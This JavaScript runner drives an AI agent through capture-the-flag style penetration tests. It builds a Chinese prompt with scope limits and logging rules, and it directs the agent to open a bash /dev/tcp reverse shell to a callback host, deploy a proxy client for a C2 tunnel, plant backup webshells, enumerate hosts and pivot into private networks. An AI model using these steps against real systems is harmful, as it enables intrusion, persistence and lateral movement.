import { spawn } from "node:child_process";
import { existsSync, mkdirSync, appendFileSync, writeFileSync } from "node:fs";
import { resolve, join } from "node:path";
import os from "node:os";
import chalk from "chalk";
import { recommendTargetGuide } from "./target-guides.js";

const PROMPT_FILE = ".pen-agent/prompt.txt";
const MAX_PROMPT_LEN = 16000;
const HISTORY_PROMPT_BUDGET = 6500;
const LAST_OUTPUT_BUDGET = 1800;
const POSIX_FALLBACK_PATHS = [
  "/opt/homebrew/bin",
  "/opt/homebrew/sbin",
  "/usr/local/bin",
  "/usr/local/sbin",
  "/usr/bin",
  "/bin",
  "/usr/sbin",
  "/sbin",
];
const WINDOWS_FALLBACK_PATHS = [
  "C:\\Windows\\System32",
  "C:\\Windows",
  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
  "C:\\Program Files\\Git\\cmd",
  "C:\\Program Files\\Git\\usr\\bin",
];

export class Runner {
  constructor(config) {
    this.config = config;
    this.runCount = 0;
  }

  async run(context, hooks = {}) {
    this.runCount++;
    const prompt = this._buildPrompt(context);
    const logDir = resolve(this.config.workDir, ".pen-agent");
    if (!existsSync(logDir)) mkdirSync(logDir, { recursive: true });

    const agentDir = this.config.agentWorkDir || this.config.workDir;
    const agentLogDir = resolve(agentDir, ".pen-agent");
    if (!existsSync(agentLogDir)) mkdirSync(agentLogDir, { recursive: true });

    const promptPath = resolve(agentDir, PROMPT_FILE);
    writeFileSync(promptPath, prompt, "utf8");

    const statusPath = join(logDir, "status.json");
    const logPath = join(logDir, "stream.log");

    this._status(statusPath, {
      phase: "running",
      iter: this.runCount,
      plan: context.loopPlan?.title || "",
      promptLen: prompt.length,
      time: new Date().toISOString(),
    });
    console.log(chalk.cyan(`\n[runner] loop ${this.runCount} started; prompt=${prompt.length} chars; raw output streams to logs.`));

    const { output, exitCode } = await this._spawn(promptPath, logPath, statusPath, hooks);

    if (exitCode === 0) {
      this._status(statusPath, { phase: "completed", iter: this.runCount, time: new Date().toISOString() });
      return { success: true, output };
    }

    this._status(statusPath, { phase: "failed", iter: this.runCount, error: `exit code ${exitCode}`, time: new Date().toISOString() });
    return { success: false, output, error: `exit code ${exitCode}` };
  }

  _spawn(promptPath, logPath, statusPath, hooks = {}) {
    return new Promise((resolvePromise) => {
      const agentDir = this.config.agentWorkDir || this.config.workDir;
      const opencodeCmd = process.platform === "win32"
        ? join(process.env.APPDATA || join(os.homedir(), "AppData", "Roaming"), "npm", "node_modules", "opencode-ai", "bin", "opencode.exe")
        : "opencode";
      const args = ["run", "Execute only this round's scoped pentest plan, then stop and hand off.", "--file", promptPath];
      if (this.config.attachUrl) args.push("--attach", this.config.attachUrl);
      args.push("--dir", agentDir);
      if (this.config.opencodeAuto) args.push("--auto");
      if (this.config.opencodeModel) args.push("--model", this.config.opencodeModel);
      if (this.config.opencodeAgent) args.push("--agent", this.config.opencodeAgent);

      appendFileSync(logPath, `\n[iter ${this.runCount}] start ${new Date().toISOString()}\n`);
      appendFileSync(logPath, `[iter ${this.runCount}] command ${opencodeCmd} ${args.join(" ")}\n`);
      const env = this._buildRunnerEnv();

      const child = spawn(opencodeCmd, args, {
        cwd: agentDir,
        stdio: ["ignore", "pipe", "pipe"],
        shell: false,
        env,
      });

      let output = "";
      child.stdout.on("data", (chunk) => {
        const text = chunk.toString();
        output += text;
        hooks.onOutput?.(text, "stdout");
        appendFileSync(logPath, text);
        process.stdout.write(text);
        this._status(statusPath, {
          phase: "running",
          iter: this.runCount,
          bytes: output.length,
          time: new Date().toISOString(),
        });
      });
      child.stderr.on("data", (chunk) => {
        const text = chunk.toString();
        output += text;
        hooks.onOutput?.(text, "stderr");
        appendFileSync(logPath, text);
        process.stderr.write(text);
      });
      child.on("close", (code) => {
        appendFileSync(logPath, `\n[iter ${this.runCount}] exit ${code} ${new Date().toISOString()}\n`);
        resolvePromise({ output, exitCode: code });
      });
      child.on("error", (err) => {
        appendFileSync(logPath, `\n[iter ${this.runCount}] error: ${err.message}\n`);
        resolvePromise({ output, exitCode: -1 });
      });
    });
  }

  _buildRunnerEnv() {
    const env = {
      ...process.env,
      FORCE_COLOR: "0",
      NO_COLOR: "1",
      PEN_AGENT_ARTIFACT_DIR: this.config.artifactDir,
      PEN_AGENT_WORK_DIR: this.config.agentWorkDir || this.config.workDir,
      PEN_AGENT_CALLBACK_HOST: this.config.callbackHost || "",
      PEN_AGENT_PROXY_PORT: String(this.config.proxyPort),
      PEN_AGENT_SCRIPTS_DIR: join(this.config.artifactDir, "scripts"),
      PEN_AGENT_PAYLOADS_DIR: join(this.config.artifactDir, "payloads"),
      PEN_AGENT_DOWNLOADS_DIR: join(this.config.artifactDir, "downloads"),
      PEN_AGENT_NOTES_DIR: join(this.config.artifactDir, "notes"),
      PEN_AGENT_PROXY_CLIENT_LINUX: join(this.config.artifactDir, "tools", "proxy-client-linux-amd64"),
      PEN_AGENT_PROXY_CLIENT_WINDOWS: join(this.config.artifactDir, "tools", "proxy-client-windows-amd64.exe"),
    };

    if (process.platform === "win32") {
      env.Path = mergePathEntries(env.Path || env.PATH, WINDOWS_FALLBACK_PATHS, ";");
      env.PATH = env.Path;
      env.ComSpec = env.ComSpec || "C:\\Windows\\System32\\cmd.exe";
      env.SHELL = env.ComSpec;
      return env;
    }

    env.PATH = mergePathEntries(env.PATH, POSIX_FALLBACK_PATHS, ":");
    env.SHELL = pickExistingShell(["/bin/bash", "/usr/bin/bash", "/bin/sh"], env.SHELL);
    return env;
  }

  _status(path, data) {
    try {
      writeFileSync(path, JSON.stringify(data, null, 2), "utf8");
    } catch {}
  }

  _buildPrompt(context) {
    const variants = promptVariants(context);
    let bestPrompt = "";

    for (const variant of variants) {
      const effectiveContext = {
        ...context,
        playbookRecommendations: (context.playbookRecommendations || []).slice(0, variant.playbooks),
        skillRecommendations: (context.skillRecommendations || []).slice(0, variant.skills),
      };
      const missionBrief = this._missionBrief(effectiveContext);
      let prompt = missionBrief;

      if (!effectiveContext.isFirstRun) {
        prompt += this._historyBrief(effectiveContext, byteLength(missionBrief));
      }

      if (!bestPrompt || byteLength(prompt) < byteLength(bestPrompt)) bestPrompt = prompt;
      if (byteLength(prompt) <= MAX_PROMPT_LEN) return prompt;
    }

    return fitText(bestPrompt, MAX_PROMPT_LEN, {
      keep: "head",
      marker: "[prompt truncated: hard budget reached after reducing playbooks, skills, and history]",
    });
  }

  _historyBrief(context, missionLength) {
    const totalBudget = Math.max(0, MAX_PROMPT_LEN - missionLength - 500);
    if (totalBudget < 500) {
      return "\n---\n\n[history omitted: mission brief reached prompt budget]\n";
    }

    const hasLastOutput = Boolean(context.lastOutput);
    const maxLastOutputLength = hasLastOutput
      ? Math.min(LAST_OUTPUT_BUDGET, Math.max(0, Math.floor(totalBudget * 0.25)))
      : 0;
    const maxHistoryLength = Math.max(400, Math.min(HISTORY_PROMPT_BUDGET, totalBudget - maxLastOutputLength - 220));
    const sections = [];

    sections.push("\n---\n\n");
    sections.push("前几轮执行历史如下。请避免重复劳动，只根据本轮计划推进；完成本轮计划后停止执行并整理交接。\n\n");
    sections.push("```text\n");
    sections.push(fitText(context.whiteboardSummary || "无历史记录。", maxHistoryLength, {
      keep: "tail",
      marker: "[history truncated: older or verbose fields omitted]",
    }));
    sections.push("\n```\n");

    if (context.lastOutput && maxLastOutputLength >= 200) {
      sections.push("\n上一轮摘要：\n\n");
      sections.push("```text\n");
      sections.push(fitText(context.lastOutput, maxLastOutputLength, {
        keep: "tail",
        marker: "[last output truncated: keeping latest summary]",
      }));
      sections.push("\n```\n");
    } else if (context.lastOutput) {
      sections.push("\n[last output omitted: history budget is limited]\n");
    }

    return sections.join("");
  }

  _missionBrief(context) {
    const scriptsDir = join(this.config.artifactDir, "scripts");
    const payloadsDir = join(this.config.artifactDir, "payloads");
    const downloadsDir = join(this.config.artifactDir, "downloads");
    const notesDir = join(this.config.artifactDir, "notes");
    const loopPlan = context.loopPlan || { title: "按现有证据推进", goals: [] };

    let p = "";
    p += "你是一个授权靶场中的自动化渗透测试 agent。目标是在受控范围内验证攻击面、发现漏洞、获取证据并尽可能找到更多 flag。\n\n";
    p += `入口目标: ${this.config.targetHost}:${this.config.targetPort}\n`;
    p += `最低 flag 目标: ${this.config.flagsNeeded}。`;
    if (this.config.maxFlags) {
      p += `当前预估目标最多可能有 ${this.config.maxFlags} 个有效 flag；这不是硬性上限。达到该数量后，如果仍发现未验证入口或额外 flag 线索，必须在总结中明确说明。`;
    } else {
      p += "找到 flag 后不要立即结束整体任务，但本轮必须按本轮计划边界停止。";
    }
    p += "\n";
    p += "Flag 分布约束: 每个节点最多只有一个有效 flag；同一节点已确认拿到 flag 后，不要在该节点上反复寻找第二个 flag，应转向尚未覆盖的节点或把后续线索写入下一轮建议。\n";
    if (context.flagsFound > 0) {
      p += `已找到 flag (${context.flagsFound}):\n`;
      for (const flag of context.foundFlags) p += `  ${flag}\n`;
    }
    p += `Flag 格式: ${this.config.flagPattern}\n\n`;

    p += "授权范围边界（强制）：\n";
    p += `- 当前公网入口授权目标为 ${this.config.targetHost}:${this.config.targetPort}，scope=${this.config.scopeMode}。\n`;
    if (this.config.scopeMode === "entry-port") {
      p += `- 公网入口层只允许访问 ${this.config.targetHost}:${this.config.targetPort}；同一公网 IP/域名的其他端口不属于本任务范围，不得扫描、访问、利用或读取 flag。\n`;
      p += "- 如果发现同公网入口的其他端口，只能记录为 out-of-scope sibling port，并立即回到当前入口或已证实的内网目标。\n";
    } else if (this.config.scopeMode === "public-host") {
      p += `- 公网入口层允许访问 ${this.config.targetHost} 上的端口，但不得主动扩展到其他公网 IP/域名。\n`;
    } else {
      p += "- 当前 scope=open，公网扩展不做端口级限制；仍需遵守用户授权范围和靶场边界。\n";
    }
    if (this.config.allowPrivatePivot) {
      p += "- 通过入口页面、RCE、SSRF、配置文件、内网 DNS、路由信息等证据发现的私网地址和内网域名允许继续验证。\n";
      p += "- 私网范围包括 10.0.0.0/8、172.16.0.0/12、192.168.0.0/16、127.0.0.0/8、以及 .local/.lan/.internal/.corp 等内网域名。\n";
    } else {
      p += "- 当前禁止私网横向，不得访问入口之外的私网地址或内网域名。\n";
    }
    p += "- 总结时必须把越界发现标为 out-of-scope，不要把它作为有效攻击面或下一轮目标。\n\n";

    p += "本轮计划（强制执行边界）：\n";
    p += `- 当前轮次: ${context.loopIndex || this.runCount}\n`;
    p += `- 阶段标题: ${loopPlan.title}\n`;
    for (const goal of loopPlan.goals || []) p += `- 本轮目标: ${goal}\n`;
    p += "- 先输出【本轮计划】，说明本轮只做哪些事、为什么做、预计使用哪些工具、停止条件是什么。\n";
    p += "- 本轮只完成上述目标；完成后立即输出【本轮停止】，不要继续扩展到下一阶段。\n";
    p += "- 如果提前发现 flag 或高危漏洞，可以完成必要取证，但不要因此展开新的大范围任务；把后续动作写入下一轮建议。\n\n";

    p += "已获访问后的推进规则（通用，不绑定某个靶场）：\n";
    p += "- 一旦通过 RCE、webshell、命令执行、SSH、SSRF 回显或类似方式获得入口节点访问，先稳定当前访问点，但不要为了反连/C2 阻塞基础枚举。\n";
    p += "- 通用后渗透顺序：\n";
    p += "  1) 立即确认权限和执行点：id; whoami; hostname; pwd; uname -a。\n";
    p += "  2) 立刻做最小网络枚举并保存证据：ip addr; ip route; cat /etc/hosts; cat /etc/resolv.conf; env | sort; command -v curl wget nc nmap python3 python bash sh ssh ftp redis-cli smbclient ldapsearch mysql psql。\n";
    p += "  3) 把接口 CIDR、默认路由、DNS search domain、hosts、LAB_ROUTES/ROUTES 等环境变量写入 notes，作为内网扫描范围依据。\n";
    p += "  4) 基础枚举完成后再尝试持久化通道；持久化失败不能阻止本轮交付内网路由和服务发现证据。\n";
    if (this.config.callbackHost) {
      p += `- 回连地址已配置: ${this.config.callbackHost}；反向 shell/C2 只能连接该地址，不要使用 localhost 作为远端回连目标。\n`;
      p += "- 持久化通道优先级（每类最多尝试 2 次，失败则记录原因并继续）：\n";
      p += `  1) bash -i >& /dev/tcp/${this.config.callbackHost}/<监听端口> 0>&1 反向 shell（如果目标有 bash 且 /dev/tcp 可用）。\n`;
      p += `  2) 下载 proxy-client 到目标 /tmp/ 并启动，连接 ${this.config.callbackHost}:${this.config.proxyPort} 建立 C2 隧道。\n`;
      p += "  3) 如果以上均失败，写入备用 webshell（不同文件名、不同路径）作为下一轮 fallback。\n";
    } else {
      p += "- 当前未配置 PEN_AGENT_CALLBACK_HOST/--callback-host；不要编造反连地址，不要让目标连接 localhost。可先完成基础枚举、服务发现和备用 webshell，汇总中明确需要 callback host 后再尝试 C2。\n";
    }
    p += "- 如果入口节点存在 DMZ 出站防火墙（无法出站到公网、ping 不通外部、反向 shell 无响应），不要反复尝试反向 shell；改用 HTTP 轮询 webshell/CGI 执行命令，每一轮 POST 新命令获取输出。\n";
    p += "- 内网扫描范围只能从实际证据推导：接口 CIDR、路由表、hosts、DNS search domain、应用配置、源码、下载文件、页面泄露和已验证服务返回；不要写死某个靶场的 IP 段。\n";
    p += "- 使用已控入口节点作为观测点做小范围服务验证，优先端口：80,443,8080,8000,8009,8983,3000,5000,5984,6379,21,22,139,389,445,3306,5432,9000,9001。\n";
    p += "- 服务发现阶段只确认连通性、banner、状态码、版本、认证状态和最小页面证据；除非本轮计划要求利用，否则不要把所有发现的服务在同一轮全部打穿。\n";
    p += "- 日志卫生强制要求：不要把整页 HTML/CSS/JS 输出到主日志。网页响应只输出 HTTP code、Location、Server、title、关键 grep 和前 20 行响应头；需要保留全文时保存到 artifacts/downloads 并在日志中摘要路径和关键发现。\n";
    p += "- 将发现的服务按指纹映射到 playbook：ThinkPHP、Spring、Apache HTTPD、Struts、Solr、GitLab/Gogs、Redis、Samba/SMB、CouchDB、ProFTPD、MinIO、LDAP、数据库。下一轮优先按服务证据执行对应 playbook。\n";
    p += "- 每个节点最多一个 flag。已确认当前节点 flag 后，停止在该节点继续寻找第二个 flag，转向未覆盖节点或把线索写入下一轮建议。\n\n";

    if (context.skillRecommendations?.length) {
      p += "Skill 加载要求（必须优先执行，playbook 的前提）：\n";
      p += "- 本轮推荐的 skill 必须用 skill 工具逐个加载阅读。Skill 提供漏洞原理、协议细节、payload 变体和失败排查方法，是执行对应 playbook 的知识基础。\n";
      for (const item of context.skillRecommendations) {
        p += `- 推荐 skill: ${item.name}，原因: ${item.reason}\n`;
      }
      p += "- 每个加载的 skill 必须在日志中输出【Skill 使用】，写明 skill 名称、命中原因、采用了哪些检查项、验证结果。\n";
      p += "- 如果某个推荐 skill 与当前目标证据不匹配，可以跳过并说明原因。\n";
      p += "- Skill 只提供打法参考，仍必须以当前靶场证据和授权边界为准，不得跳过证据链直接套用结论。\n\n";
    }

    if (context.playbookRecommendations?.length) {
      p += "漏洞 Playbook（基于 skill 原理执行的具体步骤）：\n";
      p += "- 加载对应 skill 后，按 playbook 步骤推进；playbook 是 skill 原理在靶场中的操作模板，不是独立的知识来源。\n";
      p += "- 使用 playbook 时必须输出【Playbook 使用】，写明 playbook id、命中证据、执行到的步骤、成功/失败证据和下一步。\n";
      for (const playbook of context.playbookRecommendations) {
        p += `- ${playbook.id} (${playbook.title})\n`;
        p += `  适用: ${playbook.appliesTo}; 目标 flag 位置: ${playbook.flagPath}; 常用工具: ${(playbook.tools || []).join(", ")}\n`;
        for (const [index, step] of (playbook.steps || []).entries()) {
          p += `  ${index + 1}. ${step}\n`;
        }
      }
      p += "- 如果某 playbook 不适合当前证据，必须明确跳过原因，不要强行套用 payload。\n\n";
    }

    const targetGuide = recommendTargetGuide(this.config, context);
    if (targetGuide) {
      p += `靶场打法引导（${targetGuide.id}）：\n`;
      p += `- ${targetGuide.title}\n`;
      for (const item of targetGuide.body || []) p += `- ${item}\n`;
      p += "- 该引导只在当前远程证据匹配时使用；若证据不匹配，以实际响应和授权边界为准。\n\n";
    }

    p += "产物目录要求（强制）：\n";
    p += `- 所有中间文件、Python 脚本、payload、webshell、上传样本、下载结果、字典、扫描结果、笔记都必须放在: ${this.config.artifactDir}\n`;
    p += `- Python/脚本放入: ${scriptsDir}\n`;
    p += `- payload/webshell/上传样本放入: ${payloadsDir}\n`;
    p += `- 下载文件/响应保存放入: ${downloadsDir}\n`;
    p += `- 分析笔记/阶段总结放入: ${notesDir}\n`;
    p += "- 不要在项目根目录创建 exploit.py、upload_shell.py、shell.php、.htaccess 等中间文件。\n";
    p += `- 禁止直接创建、覆盖或改写 ${this.config.artifactDir}/flags.json 和 ${this.config.artifactDir}/flags.txt；flag 输出文件由调度器自动维护。发现 flag 时只需要在日志中原样输出完整 flag 和证据命令。\n`;
    p += "- 如果需要记录 flag 证据，请写入 notes/downloads 中的新文件，不要自定义 flags.json/flags.txt 的字段或格式。\n";
    p += "- 编写代码前记录文件路径和用途；运行后记录命令、参数、输出摘要和后续影响。\n\n";

    p += "日志要求（必须使用中文，尽量详细，实时输出）：\n";
    p += "- 每个阶段使用有序标题，例如【本轮计划】、【当前进展-信息收集】、【工具调用】、【思维路径-证据判断】、【问题与修正】、【本轮汇总】、【下一轮建议】、【奖励评估】、【本轮停止】。\n";
    p += "- 每次工具调用或命令执行前后都记录：工具、完整命令或 HTTP 请求、关键参数、执行目的、预期验证点、实际输出摘要、退出状态或异常、下一步影响。\n";
    p += "- 编写脚本时必须记录：文件路径、代码用途、关键逻辑、运行命令、输出结果、失败修正。\n";
    p += "- 可以输出详细的思路摘要、判断依据和计划，但必须基于命令输出、响应内容、状态码、页面差异、文件内容等可观察证据，不要编造不可验证内容。\n";
    p += "- 保留关键证据片段：URL、参数、状态码、响应差异、命令输出摘要、上传路径、会话信息、凭据、回连地址、flag。\n\n";

    p += "有效 flag 证据规则（强制）：\n";
    p += "- 只有来自授权目标 HTTP 响应、目标 RCE/webshell/SSH/C2 输出、目标服务协议客户端输出的 flag 才算有效。\n";
    p += "- 总结每个 flag 时必须写明远程证据命令或 HTTP 请求；没有远程证据命令的 flag 视为无效。\n\n";

    p += "本轮停止标准：\n";
    p += "- 达成本轮计划列出的目标后必须停止，并输出【本轮汇总】、【证据清单】、【问题与修正】、【下一轮建议】、【奖励评估】、【本轮停止】。\n";
    p += "- 不要在同一轮里同时完成信息收集、扫描、利用、横向、收尾等多个大阶段。\n";
    p += "- 如果遇到网络或工具问题，先记录现象、命令、错误和替代方案；替代方案仍需服务于本轮目标。\n\n";

    p += "复杂协议处理要求：\n";
    p += "- 遇到 SMB/NetBIOS(139/445)、MySQL/MariaDB(3306)、LDAP(389)、SSH(22) 等非 HTTP 复杂协议时，先检查当前执行环境是否具备对应客户端或库，例如 smbclient、mount.cifs、mysql/mariadb、ldapsearch、ssh、python3+impacket/ldap3/pymysql。\n";
    p += "- 对 SMB 目标不要把 445/139 当作 HTTP 或纯文本 banner 服务处理；SMB 需要协议协商、会话建立、共享连接和文件读取，裸 fsockopen/fread、curl smb://、nc 随机发包通常不能作为有效利用方式。\n";
    p += "- 如果 445/139 端口可达但缺少 smbclient、mount.cifs、python3+impacket 或稳定 TCP 隧道，应停止重复裸 TCP 尝试，把该目标记录为“TCP 可达但缺少 SMB 协议客户端/隧道”。\n";
    p += "- 发现协议客户端缺失后，优先寻找具备工具的内网跳板节点、开发机或已控主机；如果存在 dev/workstation/bastion/jump host，应评估是否可在该节点上运行协议客户端，或建立 TCP 隧道后在本机使用协议客户端。\n";
    p += "- 如果靶场页面、README、配置文件或数据库中已经给出 jump/dev/MinIO/Samba 等凭据或服务级捷径，要优先把它们作为证据驱动路径验证；不要只尝试通用默认密码。\n";
    p += "- 以下 local-goad 规则只在已出现 10.80.*、corp.local 或 local-goad 证据时适用；sentinel/10.92 靶场不要套用这些 10.80 示例。\n";
    p += "- 对 local-goad 形态的 Samba，优先目标是读取 //files01/myshare/flag.txt；如果用户授权范围允许访问公开 jump01 SSH 端口，可建立本机到 files01:445 的端口转发后使用本机 smbclient；如果已通过入口或内网凭据进入 dev01，则直接在 dev01 上运行 smbclient。\n";
    p += "- 对 local-goad 形态的 MinIO，公开对象路径通常是 http://minio01:9000/flag/flag.txt 或 http://10.80.30.50:9000/flag/flag.txt；若需要认证，优先验证已发现的 MinIO root 凭据，而不是只猜 minioadmin/minioadmin。\n";
    p += "- 对 files01、db01、ldap01 等协议型节点，汇总时必须写清楚：端口连通性、已检查的客户端工具、失败原因、下一步需要的跳板/隧道/凭据，而不是简单写“失败”。\n\n";

    p += "奖励机制：\n";
    p += "- 如果严格按本轮计划完成并给出清晰证据链，在【奖励评估】中记为「基础奖励」。\n";
    p += "- 如果在不超出本轮边界的前提下发现 flag、关键凭据、可复现漏洞、源码/配置泄露或高价值入口，在【奖励评估】中记为「额外奖励」，说明奖励原因。\n";
    p += "- 如果超额完成但导致日志混乱、跳过证据、污染根目录或重复无效扫描，不得给奖励，并说明扣分原因。\n\n";

    p += "可用能力：\n";
    p += "- shell 工具链，以当前环境实际可用为准，例如 curl、nmap、gobuster、hydra、netcat、python。\n";
    p += "- runner 已为 macOS/Linux/Windows 补齐常见工具 PATH，并在 POSIX 系统上优先使用 bash/sh；命令中不要重新赋值 PATH/path，也不要在循环中使用 path 作为变量名。\n";
    p += "- 循环变量请使用 item、target_path、route、name 等；如果出现 curl/nmap/python 间歇性 command not found，优先检查当前命令是否覆盖了 PATH/path，并用 command -v 复核工具位置。\n";
    p += "- 横向代理服务已启动时可使用，但只在本轮计划允许时使用。\n";
    p += `- 代理服务端监听本机: 0.0.0.0:${this.config.proxyPort}\n`;
    p += `- 目标回连地址: ${this.config.callbackHost || "未配置；不要使用 localhost 作为目标回连地址"}\n`;
    p += `- 工具产物环境变量: PEN_AGENT_ARTIFACT_DIR=${this.config.artifactDir}\n`;
    p += `- 回连环境变量: PEN_AGENT_CALLBACK_HOST=${this.config.callbackHost || ""}\n`;
    p += `- Linux proxy-client 可用路径: ${join(this.config.artifactDir, "tools", "proxy-client-linux-amd64")}\n`;
    p += `- Windows proxy-client 可用路径: ${join(this.config.artifactDir, "tools", "proxy-client-windows-amd64.exe")}\n`;
    return p;
  }
}

function mergePathEntries(currentPath, fallbackEntries, delimiter) {
  const seen = new Set();
  const entries = [];
  for (const entry of [...fallbackEntries, ...(currentPath || "").split(delimiter)]) {
    const normalized = entry.trim();
    if (!normalized || seen.has(normalized)) continue;
    seen.add(normalized);
    entries.push(normalized);
  }
  return entries.join(delimiter);
}

function pickExistingShell(candidates, fallback) {
  for (const shell of candidates) {
    if (existsSync(shell)) return shell;
  }
  return fallback || "/bin/sh";
}

function promptVariants(context = {}) {
  const playbookCount = context.playbookRecommendations?.length || 0;
  const skillCount = context.skillRecommendations?.length || 0;
  const playbookLimits = uniqueDescending([
    playbookCount,
    Math.min(playbookCount, 5),
    Math.min(playbookCount, 3),
    Math.min(playbookCount, 1),
    0,
  ]);
  const skillLimits = uniqueDescending([
    skillCount,
    Math.min(skillCount, 3),
    Math.min(skillCount, 1),
    0,
  ]);

  const variants = [];
  for (const playbooks of playbookLimits) {
    for (const skills of skillLimits) {
      variants.push({ playbooks, skills });
    }
  }
  return variants;
}

function uniqueDescending(values) {
  return [...new Set(values.filter((value) => Number.isInteger(value) && value >= 0))]
    .sort((a, b) => b - a);
}

function fitText(value, maxLength, options = {}) {
  const text = String(value || "");
  if (byteLength(text) <= maxLength) return text;

  const marker = options.marker || "[truncated]";
  const markerBlock = `${marker}\n`;
  const budget = Math.max(0, maxLength - byteLength(markerBlock));
  if (budget <= 0) return marker;

  if (options.keep === "tail") {
    return markerBlock + trimToLineBoundary(takeBytes(text, budget, "tail"), "start");
  }

  return trimToLineBoundary(takeBytes(text, budget, "head"), "end") + `\n${marker}`;
}

function byteLength(value) {
  return Buffer.byteLength(String(value || ""), "utf8");
}

function takeBytes(text, maxBytes, keep) {
  const chars = Array.from(String(text || ""));
  let low = 0;
  let high = chars.length;
  let best = "";

  while (low <= high) {
    const mid = Math.floor((low + high) / 2);
    const candidate = keep === "tail"
      ? chars.slice(chars.length - mid).join("")
      : chars.slice(0, mid).join("");

    if (byteLength(candidate) <= maxBytes) {
      best = candidate;
      low = mid + 1;
    } else {
      high = mid - 1;
    }
  }

  return best;
}

function trimToLineBoundary(text, side) {
  if (!text) return "";
  if (side === "start") {
    const index = text.indexOf("\n");
    return index >= 0 ? text.slice(index + 1) : text;
  }
  const index = text.lastIndexOf("\n");
  return index >= 0 ? text.slice(0, index) : text;
}
